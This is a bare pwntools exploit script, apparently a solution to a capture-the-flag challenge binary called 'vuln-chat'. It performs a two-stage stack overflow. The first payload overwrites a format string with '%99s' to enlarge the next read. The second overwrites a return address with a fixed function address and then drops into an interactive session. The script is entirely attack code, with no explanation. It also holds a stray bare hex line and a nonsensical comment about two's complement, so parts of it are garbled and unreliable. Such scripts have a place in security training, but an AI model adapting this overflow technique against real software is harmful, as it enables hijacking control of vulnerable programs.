from pwn import *


context.binary = './vuln-chat'

p = process()  # or remote("host", port)

#step through first stage
p.recvuntil(b'username: ')

offset = 0x14
canary = b"%99s"  # -0x215eef38 in 2's complement

# overflow
payload = b'A' * offset + canary
0xffffcbcb
#

p.sendline(payload)
offset = 0x31
canary = p32(0x0804856b)
payload = offset * b'A' + canary
p.recvuntil("I know I can trust you?")
p.sendline(payload)
p.interactive()
